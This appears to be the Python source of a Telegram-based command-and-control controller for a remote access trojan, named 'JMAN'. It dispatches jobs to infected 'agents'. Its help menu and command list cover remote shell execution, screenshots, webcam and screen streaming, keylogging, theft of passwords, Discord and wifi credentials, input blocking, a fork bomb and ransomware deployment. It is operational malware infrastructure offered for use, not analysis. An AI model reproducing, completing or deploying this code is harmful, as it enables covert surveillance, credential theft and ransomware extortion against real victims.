#
# JMAN C2 Bot Controller - FIXED & UPGRADED
# - UPDATED: Removed 'cookies' command and updated /help menu for new grabber.
#
import os
import re
import json
import uuid
import httpx
import asyncio
import traceback
import time
from datetime import datetime
from flask import Flask, request, Response

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# --- Configuration ---
TOKEN = os.getenv("TELEGRAM_TOKEN")
SECRET_TOKEN = os.getenv("SECRET_TOKEN")
JOBS_URL = os.getenv("JOBS_URL")
STATE_URL = os.getenv("STATE_URL")
HEARTBEAT_URL = os.getenv("HEARTBEAT_URL")

# --- Initialize Flask and the Telegram Bot Application ---
app = Flask(__name__)
ptb_app = Application.builder().token(TOKEN).build()

# (The helper functions remain the same)
# ...
def esc(text):
    """Escapes characters for Telegram's MarkdownV2 parser."""
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))

async def make_async_request(method, url, json_data=None, retries=3, delay=2):
    """A robust helper for making async HTTP requests with retries."""
    async with httpx.AsyncClient() as client:
        for attempt in range(retries):
            try:
                if method.upper() == 'GET':
                    res = await client.get(url, timeout=10)
                elif method.upper() == 'POST':
                    res = await client.post(url, json=json_data, timeout=10)
                res.raise_for_status()
                return res.json()
            except httpx.RequestError as e:
                print(f"Attempt {attempt + 1}/{retries}: Network error for {url}: {e}")
                if attempt < retries - 1:
                    await asyncio.sleep(delay)
            except Exception as e:
                print(f"Attempt {attempt + 1}/{retries}: Unexpected error for {url}: {e}")
                return None
        print(f"Failed to connect to {url} after {retries} attempts.")
        return None

async def get_state():
    """Fetches the currently selected target ID from the state URL."""
    data = await make_async_request('GET', STATE_URL)
    return data.get("selected_target") if data else None

async def set_state(target_id):
    """Sets the currently selected target ID."""
    return await make_async_request('POST', STATE_URL, json_data={"selected_target": target_id})

async def post_job(target_id, command, args):
    """Appends a new job to the job queue."""
    job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
    
    current_jobs = await make_async_request('GET', JOBS_URL)
    if current_jobs is None: current_jobs = []
    if not isinstance(current_jobs, list):
        print(f"Warning: Data at JOBS_URL is not a list. Resetting. Data: {current_jobs}")
        current_jobs = []
        
    current_jobs.append(job)
    return await make_async_request('POST', JOBS_URL, json_data=current_jobs)

# (Core command handlers like /list, /target, /destroy remain the same)
# ...
async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lists all currently active agents based on the heartbeat data."""
    await update.message.reply_text("⏳ Fetching active agents...", parse_mode=ParseMode.MARKDOWN_V2)
    
    agents = await make_async_request('GET', HEARTBEAT_URL)
    selected_target = await get_state()
    
    if not agents or not isinstance(agents, list):
        await update.message.reply_text("❌ No agents found or error fetching agent list.", parse_mode=ParseMode.MARKDOWN_V2)
        return

    agents.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
    
    response_text = "*ONLINE AGENTS*\n\n"
    for agent in agents:
        is_selected = "🎯" if agent.get("id") == selected_target else "➖"
        last_seen = datetime.fromtimestamp(agent.get("timestamp", 0)).strftime('%Y-%m-%d %H:%M:%S')
        is_admin = "Yes" if agent.get("is_admin") else "No"
        
        response_text += (
            f"{is_selected} *ID:* `{esc(agent.get('id', 'N/A'))}`\n"
            f"   *User:* `{esc(agent.get('user', 'N/A'))}`\n"
            f"   *Admin:* `{esc(is_admin)}`\n"
            f"   *Last Seen:* `{esc(last_seen)}`\n\n"
        )
    
    response_text += "_Use `/target <id>` to select an agent\\._"
    await update.message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)


async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Sets the target for subsequent commands."""
    if not context.args:
        await update.message.reply_text("Usage: `/target <id|all|clear>`", parse_mode=ParseMode.MARKDOWN_V2)
        return
        
    target_id = context.args[0]
    
    if target_id.lower() == 'clear':
        if await set_state(None):
            await update.message.reply_text("✅ Target cleared.", parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text("❌ Failed to clear target.", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        if await set_state(target_id):
            await update.message.reply_text(f"🎯 Target set to: `{esc(target_id)}`", parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text("❌ Failed to set target.", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Uninstalls the agent from a specific machine."""
    if len(context.args) != 2 or context.args[1].upper() != 'CONFIRM':
        await update.message.reply_text(
            "⚠️ *DANGER:* This command is irreversible and will remove the agent\\.\n"
            "To confirm, use: `/destroy <id> CONFIRM`",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return
    
    target_id = context.args[0]
    if await post_job(target_id, "destroy", ""):
        await update.message.reply_text(f"✅ Self-destruct command sent to agent `{esc(target_id)}`\\.", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text("❌ Error: Failed to dispatch destroy command\\.", parse_mode=ParseMode.MARKDOWN_V2)


async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles all other agent-specific commands."""
    selected_target = await get_state()
    if not selected_target:
        await update.message.reply_text("❌ No target selected\\. Use `/target <id>` first\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return
        
    command = update.message.text.split(' ')[0][1:]
    args = " ".join(context.args)
    
    if await post_job(selected_target, command, args):
        await update.message.reply_text(f"✅ Job `{esc(command)}` dispatched to `{esc(selected_target)}`\\.", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text("❌ Error: Failed to dispatch job\\.", parse_mode=ParseMode.MARKDOWN_V2)


# --- UPDATED: Help Command ---
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Displays the help menu."""
    help_text = (
        "*AGENT CONTROLLER HELP MENU*\n\n"
        "Use these commands to manage and control your agents\\.\n\n"
        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
        "*🎯 CORE COMMANDS*\n"
        "`/list` \\- Show all active agents\n"
        "`/target <id|all|clear>` \\- Set the active agent\n"
        "`/help` \\- Display this help menu\n\n"
        
        "*💻 SYSTEM & INFO*\n"
        "`/info` \\- Get detailed system information\n"
        "`/exec <command>` \\- Execute a shell command\n\n"
        
        "*👁️ SURVEILLANCE*\n"
        "`/ss` \\- Take a screenshot\n"
        "`/cam` \\- Take a webcam photo\n"
        "`/startkeylogger` \\- Begin capturing keystrokes\n"
        "`/stopkeylogger` \\- Stop and upload keylog\n\n"

        "*🔴 LIVE STREAMING*\n"
        "`/livestream` \\- Start a live screen stream\n"
        "`/stoplivestream` \\- Stop the screen stream\n"
        "`/livecam` \\- Start a live webcam stream\n"
        "`/stoplivecam` \\- Stop the webcam stream\n\n"

        "*🔊 AUDIO & VISUAL MISCHIEF*\n"
        "`/tts <male|female> <msg>` \\- Play Text\\-to\\-Speech\n"
        "`/flashscreen <effect>` \\- Apply visual screen glitch\n"
        "  *Effects: invert, noise, lines, color\\_squares*\n"
        "`/stopflashscreen` \\- Stop the visual effect\n\n"

        "*🚫 SYSTEM CONTROL \\(Admin\\)*\n"
        "`/blockwebsite <url>` \\- Block website access\n"
        "`/unblockwebsite <domain>` \\- Unblock a website\n"
        "`/blockkeyboard` \\- Disable keyboard input\n"
        "`/unblockkeyboard` \\- Enable keyboard input\n"
        "`/blockmouse` \\- Disable mouse input\n"
        "`/unblockmouse` \\- Enable mouse input\n\n"

        "*🔑 DATA EXFILTRATION*\n"
        "`/grab <type>` \\- Steal data \\(passwords, etc\\.\\)\n"
        "  *Types: all, passwords, history, discord, wifi*\n\n"
        
        "*📁 FILE SYSTEM*\n"
        "`/ls` \\- List files\n"
        "`/cd <dir>` \\- Change directory\n"
        "`/download <file>` \\- Download a file\n\n"
        
        "*💣 DESTRUCTIVE & ADVANCED \\(Admin\\)*\n"
        "`/forkbomb` \\- ⚠️ Rapidly spawns processes\n"
        "`/cancelforkbomb` \\- Stop the fork bomb\n"
        "`/destroy <id> CONFIRM` \\- Uninstall the agent\n\n"

        "☢️ *RANSOMWARE COMMANDS* ☢️\n"
        "*WARNING: THESE ARE REAL AND IRREVERSIBLE\\! USE WITH EXTREME CAUTION\\.*\n"
        "`/ransomware [msg]` \\- Deploys ransomware\\. Optionally provide a custom message for the background\\.\n"
        "`/restore <key>` \\- Restores files using the key you received\\.\n"
    )
    await update.message.reply_text(help_text, parse_mode='MarkdownV2')


# --- UPDATED: Agent Command List ---
ptb_app.add_handler(CommandHandler("help", cmd_help))
ptb_app.add_handler(CommandHandler("list", cmd_list_agents))
ptb_app.add_handler(CommandHandler("target", cmd_target))
ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))

agent_commands = [
    "info", "exec", "ss", "cam", "startkeylogger", "stopkeylogger", 
    "livestream", "stoplivestream", "livecam", "stoplivecam",
    "grab", "ls", "cd", "download", "pwd",
    "blockkeyboard", "unblockkeyboard", "blockmouse", "unblockmouse",
    "forkbomb", "cancelforkbomb", "ransomware", "restore",
    "tts", "blockwebsite", "unblockwebsite", "flashscreen", "stopflashscreen",
    "startblocker", "stopblocker"
]
for cmd in agent_commands:
    ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))

# (The main webhook endpoint and async processing remain the same)
# ...
@app.route('/', methods=['POST'])
def process_webhook():
    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
        return Response('Unauthorized', status=403)
    update_data = request.get_json(force=True)
    asyncio.run(process_update_async(update_data))
    return Response('OK', status=200)

async def process_update_async(update_data):
    try:
        async with ptb_app:
            update = Update.de_json(update_data, ptb_app.bot)
            await ptb_app.process_update(update)
    except Exception as e:
        print(f"Error processing update: {e}")
        traceback.print_exc()

@app.route('/', methods=['GET'])
def health_check():
    return "Bot is running.", 200

if __name__ == '__main__':
    app.run(debug=True, port=5000)
